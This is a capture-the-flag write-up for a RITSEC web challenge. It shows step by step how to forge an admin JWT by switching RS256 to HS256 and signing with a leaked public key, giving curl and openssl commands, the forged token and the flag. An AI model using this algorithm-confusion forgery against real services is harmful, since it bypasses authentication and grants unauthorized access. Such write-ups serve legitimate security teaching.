# Our First API

## Web - Points: 500

> ctfchallenges.ritsec.club:3000 ctfchallenges.ritsec.club:4000
>
> 
>
> Author: sandw1ch
>

You have the following endpoints:

	ctfchallenges.ritsec.club:3000/auth
	ctfchallenges.ritsec.club:4000/api/normal
	ctfchallenges.ritsec.club:4000/api/admin

When trying to access the API endpoints, it claims that a JWT authorization is missing.

	$ curl ctfchallenges.ritsec.club:4000/api/normal
	Forbidden, missing JWT authorization

You can get a JTW token when accessing the `/auth` endpoint that requires a name parameter:

	$ curl ctfchallenges.ritsec.club:3000/auth?name=admin
	{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJuYW1lIjoiYWRtaW4iLCJ0eXBlIjoidXNlciIsImlhdCI6MTU3NDExNDU3N30.tAg_5g-W5Ch5iauAtWA-ZyfMunJX2YDbNpKgxvvPp0ciMF8YDt7EoUJhs9A-WxzC2z0xs72Kv_5C4HBoCG3Wz-y5on6wDNBZotwCd-vjRXRWURSfoTftnvtvfvF408IUEDVJ_T5ftcT03WDBOWiz2_AhLMJ5mENd4g1aPc__Z7M"}

You can use that JWT for the `/api/normal` endpoint, but as expected you have to be admin:

	$ curl http://ctfchallenges.ritsec.club:4000/api/normal -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJuYW1lIjoiYWRtaW4iLCJ0eXBlIjoidXNlciIsImlhdCI6MTU3NDExNDU3N30.tAg_5g-W5Ch5iauAtWA-ZyfMunJX2YDbNpKgxvvPp0ciMF8YDt7EoUJhs9A-WxzC2z0xs72Kv_5C4HBoCG3Wz-y5on6wDNBZotwCd-vjRXRWURSfoTftnvtvfvF408IUEDVJ_T5ftcT03WDBOWiz2_AhLMJ5mENd4g1aPc__Z7M'
	{"flag":"Congrats on authenticating! Too bad flags aren't for normal users !!"}

Using that token for the `/api/admin` endpoint returns `Not an admin!`, so lets check what is inside that token.

You can go to https://jwt.io/ and paste token to quickly see the contents. The payload contains the following:

	{
	  "name": "admin",
	  "type": "user",
	  "iat": 1574114577
	}

Obviously we have to forge our own token and change the type `user` to `admin`, but we have to sign it with the private key, otherwise the signature check fails.

I tried to modify the header that specifies the algorithm and token type and changed `"alg": "RS256"` to `"alg": "none"` (I read this somewhere) but it didn't worked out.

But already when I started with the challenge, I looked into the source code of the API documentation and found this comment `<!-- Robots can help you with the api -->`, and when checking the `robots.txt` we get the following:

	$ curl http://ctfchallenges.ritsec.club:3000/robots.txt
	User-agent: *
	Disallow: /signing.pem
	Disallow: /auth

So we get the `signing.pem`, the public key that will be used to verify the signature of the JWT. This must somehow be a hint, so I started googling around and found this: https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/january/jwt-attack-walk-through/

We modify the header and change the algorithm `"alg": "RS256"` (RSA) to `"alg": "HS256"` (HMAC), that uses a shared key for signing and verification. Then we modify our payload and set `"type": "admin"` and create our HMAC signature with the public key used as secret. When we send this token to the API, it hopefully accepts the changed algorithm type and processes the signature as type HMAC with the public key now serving as the secret key.

After modifying the header and payload and after encoding with base64 the JWT looks like this:

	eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiYWRtaW4iLCJ0eXBlIjoiYWRtaW4iLCJpYXQiOjE1NzM5OTMyNDZ9

Then we create our HMAC signature with the public key as secret and convert it to base64 (these steps are taken from the article):

	$ cat signing.pem | xxd -p | tr -d "\\n"
	$ echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiYWRtaW4iLCJ0eXBlIjoiYWRtaW4iLCJpYXQiOjE1NzM5OTMyNDZ9" | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e205055424c4943204b45592d2d2d2d2d0a4d4947664d413047435371475349623344514542415155414134474e4144434269514b426751444271757a4d476b5a6c4a6d5a6d34705970707865446d7347640a382b396d4f683553394f375737477535564279666c3769334a6443664778524a6448736367366c333231506554587358475a37676f486434586a762f46744b510a44796f614b716c344b6c3639324b4b4b4e2f39784136744b644f5951625a76507179525855564f4764795a31327146424f517a49376f783232594c33756c2f330a6e796944522b702b4a4b62645655364157514944415141420a2d2d2d2d2d454e44205055424c4943204b45592d2d2d2d2d0a
	$ python2 -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('1c0a91a9e5e1a74f8f2f57cd443984d2904a826a21bb41a672d246a7005d4e9b')).replace('=','')\")"

The JTW with signature looks like this:

	eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiYWRtaW4iLCJ0eXBlIjoiYWRtaW4iLCJpYXQiOjE1NzM5OTMyNDZ9.HAqRqeXhp0-PL1fNRDmE0pBKgmohu0GmctJGpwBdTps

Lets send it to the API:

	$ curl http://ctfchallenges.ritsec.club:4000/api/admin -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiYWRtaW4iLCJ0eXBlIjoiYWRtaW4iLCJpYXQiOjE1NzM5OTMyNDZ9.HAqRqeXhp0-PL1fNRDmE0pBKgmohu0GmctJGpwBdTps'

flag: `RITSEC{JWT_th1s_0ne_d0wn}`